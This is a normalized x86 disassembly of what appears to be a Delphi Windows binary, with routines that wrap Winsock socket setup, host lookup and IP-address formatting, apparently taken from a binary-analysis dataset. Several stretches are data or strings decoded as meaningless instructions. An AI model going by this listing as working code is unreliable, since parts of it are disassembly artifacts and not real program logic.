add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ 0x53644945 ] cl
je r-xdata
retn 0x4
arpl [ ebx + 0x53 ] bp
je r-xdata
je r-xdata
arpl [ ebx + 0x45 ] bp
jb r-xdata
add [ eax ] al
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
lea ecx [ esp + 0x4 ]
call sub_471cc0
retn
imul edi [ edx + 0x65 ] 0x65637845
push 0xffffffff
je r-xdata
inc esi
popad
imul ebp [ ebp + 0x64 ] 0x9c00408d
sbb al 0x47
popad
insb
imul edi [ edx + 0x61 ] 0x6e6f6974
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx + 0xc0047 ] bl
add [ eax ] al
mov [ ebx ] bl
inc edi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edi ] dl
inc ebp
dec ecx
push ebx
je r-xdata
inc edi
outsd
jb r-xdata
add [ eax ] al
shl [ eax ] 0x1c
sub_471cc0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi eax
xor ebx ebx
inc edx
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x6c ]
mov [ esi + 0x4 ] eax
mov edx [ ebp + 0x8 ]
test edx edx
jl r-xdata
mov edx [ esi + 0x4 ]
mov eax esi
call sub_471d74
inc edx
mov eax edi
add eax 0x4
dec edx
jne r-xdata
mov bl 0x1
jmp r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
sub_471d08
push ebp
mov ebp esp
push 0x0
push ebx
xor ebx ebx
push ebp
push sub_471d67
push [ fs : ebx ]
mov [ fs : ebx ] esp
push ecx
mov ecx 0x2
xchg edx ecx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471d6e
lea eax [ ebp - 0x4 ]
call sub_404118
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
sub_471d74
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_471dc6
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x68 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_470530
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471dcd
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_471e00
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx r-xdata
mov eax ebx
call sub_408248
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4722ac
test al al
je r-xdata
mov eax edi
mov edx r-xdata
call sub_40416c
jmp r-xdata
mov ecx edi
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax edi
mov edx ebx
call sub_40416c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_471e78
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
xor eax eax
push ebp
push sub_472272
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404118
mov eax esi
add eax 0xffffd8ec
cmp eax 0x3e
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405f7c
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_409280
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_40416c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472279
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
jmp [ eax * 4 + jump_table_471eb8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405f7c
sub_472280
push ebx
mov ebx eax
or edx 0xffffffff
mov eax ebx
call sub_408684
inc eax
jle r-xdata
xor eax eax
pop ebx
retn
mov edx 0x100
mov eax ebx
call sub_408684
cmp eax 0x100
jl r-xdata
mov al 0x1
pop ebx
retn
sub_4722ac
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_47236b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_47423c
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_47423c
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_47423c
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_4041b0
mov eax [ ebp - 0x8 ]
call sub_472280
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_472280
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472372
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_40413c
retn
mov eax [ ebp - 0x10 ]
call sub_472280
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_472280
test al al
jne r-xdata
mov bl 0x1
sub_472388
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4723b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_472400
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472407
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_472410
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_472435
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47243c
retn
sub_472448
xchg esp eax
and al 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x1080047 ] ah
add [ eax ] al
xor [ edx ] bl
inc edi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax + 0x38004733 ] ah
xor eax [ edi ]
or [ edi + eax * 2 ] dh
add [ ebx + esi + 0x54140047 ] bl
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax + 0x26 ] ah
inc edi
add [ edi + ebp + 0x47 ] ah
add [ eax + esi ] cl
inc edi
add ah bl
sub al 0x47
add [ ebp + 0x27380047 ] bl
inc edi
add al cl
daa
inc edi
add [ eax + ebp ] dh
inc edi
add [ eax + 0x28 ] al
inc edi
add [ eax + 0x3c004728 ] dl
sub [ edi ] eax
in al dx
imul esi [ ebx + 0x74 ] 0x646e6957
outsd
ja r-xdata
xchg ebp eax
insb
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x5573776f
mov ebp esp
add esp 0xfffffe6c
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x194 ] ecx
test dl dl
je r-xdata
sub [ edi ] al
cmp al 0x2d
inc edi
add [ esi + ebp + 0x47 ] al
add [ ebp + 0x29780047 ] ah
inc edi
add [ eax ] dh
sub eax 0x2f4c0047
inc edi
add [ eax + 0x2f ] bl
inc edi
add [ ecx + ebp + 0x29a00047 ] al
inc edi
add [ ebx + ebp ] bl
inc edi
add [ esp + ebp ] dh
inc edi
add [ eax + 0x2c ] dl
inc edi
add [ esp + ebp + 0x2d0c0047 ] bh
inc edi
add ah cl
xor [ edi ] eax
cmp al 0x34
inc edi
add [ eax ] al
sub eax 0x31d80047
inc edi
add [ eax + 0x32 ] bh
inc edi
add [ eax ] bl
xor eax [ edi ]
mov [ esi ] ah
inc edi
add al dh
xor [ edi ] al
andps xmm1 [ ecx + 0x64 ]
push ebx
je r-xdata
cmp al 0x29
inc edi
add ah ch
lea eax [ eax ]
or [ 0x47 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ 0x100047 ] fs
add [ eax ] al
pushfd
sbb al [ edi ]
dec esp
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_47263a
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_471dd4
cmp [ rw-data ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403668
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472641
lea eax [ ebp - 0x194 ]
call sub_404118
retn
lea eax [ ebp - 0x18e ]
push eax
push 0x202
call sub_4718a4
inc eax
jne r-xdata
mov [ rw-data ] 0x1
lea edx [ ebp - 0x194 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x194 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
sub_472660
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_472388
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_472688
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_47271c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov al [ ebx ]
lea edx [ ebp - 0x4 ]
call sub_40850c
push [ ebp - 0x4 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x1 ]
lea edx [ ebp - 0x8 ]
call sub_40850c
push [ ebp - 0x8 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x2 ]
lea edx [ ebp - 0xc ]
call sub_40850c
push [ ebp - 0xc ]
push r-xdata
xor eax eax
mov al [ ebx + 0x3 ]
lea edx [ ebp - 0x10 ]
call sub_40850c
push [ ebp - 0x10 ]
mov eax esi
mov edx 0x7
call sub_404498
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472723
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40413c
retn
sub_47272f
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4727b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_40416c
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4727be
lea eax [ ebp - 0x1c ]
call sub_404118
retn
sub_4727c8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov ax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] ax
mov eax esi
call sub_4043d8
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_4723b8
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x12 ] ax
push 0x10
lea eax [ ebp - 0x14 ]
push eax
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_472840
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x10 ] cx
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4723b8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_472890
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax edi
call sub_4045d8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov dl [ eax ]
mov [ esp ] dl
mov dl [ eax + 0x1 ]
mov [ esp + 0x1 ] dl
mov dl [ eax + 0x2 ]
mov [ esp + 0x2 ] dl
mov al [ eax + 0x3 ]
mov [ esp + 0x3 ] al
mov ecx esi
mov edx esp
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
or edx 0xffffffff
mov eax ebx
call sub_471cb4
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_4728ec
push ebx
push esi
push edi
push ecx
mov edi ecx
mov ebx edx
mov esi eax
mov eax ebx
call sub_4045d8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esp ] eax
push 0x2
push 0x4
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
jne r-xdata
mov eax edi
mov edx [ ebx ]
call sub_404310
or edx 0xffffffff
mov eax esi
call sub_471cb4
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_47293c
push ebx
mov ebx edx
mov eax ebx
mov edx 0xfa
call sub_404764
mov eax [ ebx ]
call sub_4043d8
push eax
mov eax [ ebx ]
call sub_4045d8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebx ]
call sub_4045d8
mov edx eax
mov eax ebx
call sub_404310
pop ebx
retn
sub_472984
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_4729a0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_472a2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x10
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp + 0xc ]
call sub_40416c
mov ax [ ebp - 0x16 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472a32
lea eax [ ebp - 0x1c ]
call sub_404118
retn
sub_472a3c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx [ eax ]
call [ edx + 0x8 ]
mov edx [ ebx ]
mov eax edi
call sub_418eb4
mov esi [ ebx ]
dec esi
test esi esi
jl r-xdata
inc esi
lea eax [ ebx + 0x4 ]
mov ebx eax
mov edx [ ebx ]
mov eax edi
call sub_418b9c
add ebx 0x4
dec esi
jne r-xdata
sub_472a78
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_472b0d
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472b14
lea eax [ ebp - 0xc ]
call sub_404118
retn
cmp [ edi + 0x8 ] 0x40
jle r-xdata
mov esi [ edi + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
mov eax [ edi + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
inc esi
mov [ ebp - 0x8 ] 0x0
mov ebx [ ebp - 0x4 ]
add ebx 0x4
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_418cf8
mov [ ebx ] eax
inc [ ebp - 0x8 ]
add ebx 0x4
dec esi
jne r-xdata
sub_472b1c
push ebp
mov ebp esp
add esp 0xfffffcec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x10c ]
xor ecx ecx
mov edx 0x104
call sub_402d00
lea eax [ ebp - 0x210 ]
xor ecx ecx
mov edx 0x104
call sub_402d00
lea eax [ ebp - 0x314 ]
xor ecx ecx
mov edx 0x104
call sub_402d00
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_472a78
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_472a78
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_472a78
cmp ebx 0xfffffffe
jne r-xdata
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax ebx
mov ecx 0x3e8
cdq
idiv ecx
imul eax edx 0x3e8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
push 0x0
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
lea edx [ ebp - 0x10c ]
mov eax esi
call sub_472a3c
lea edx [ ebp - 0x210 ]
mov eax edi
call sub_472a3c
lea edx [ ebp - 0x314 ]
mov eax [ ebp + 0xc ]
call sub_472a3c
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_472c34
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x8
sub_472c50
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
xor ecx ecx
mov edx 0x10
call sub_402d00
mov [ ebp - 0x10 ] 0x2
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4723b8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0xe ] ax
push 0x10
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push edi
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_472cbc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_472cdc
push ebx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0xc ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebx + 0xc ] eax
sub_472d3c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_472e09
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4045d8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
push ebp
push j_sub_403910#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_408648
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472e10
lea eax [ ebp - 0x10 ]
call sub_404118
retn
sub_472db8
add [ ebp - 0x74ffb8d3 ] bh
inc ebp
cld
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
call sub_403ad0
call sub_403b4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472e10
lea eax [ ebp - 0x10 ]
call sub_404118
retn
sub_472e2f
inc [ eax ]
add [ eax ] al
add [ esi ] cl
dec ecx
push ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
test esi esi
je r-xdata
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x9073776f
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
xor eax eax
push ebp
push sub_472f39
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_405400
xor eax eax
push ebp
push j_sub_4037e4#5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
push eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx [ esi ]
call sub_404310
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor ebx ebx
lea eax [ ebp - 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ r-xdata ]
call sub_40543c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472f40
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40413c
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_405400
retn
mov eax [ ebp - 0x8 ]
mov esi [ eax + ebx * 4 ]
test esi esi
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_404310
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc ebx
sub_472f03
mov eax [ ebp - 0x4 ]
call sub_40331c
call sub_403b4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472f40
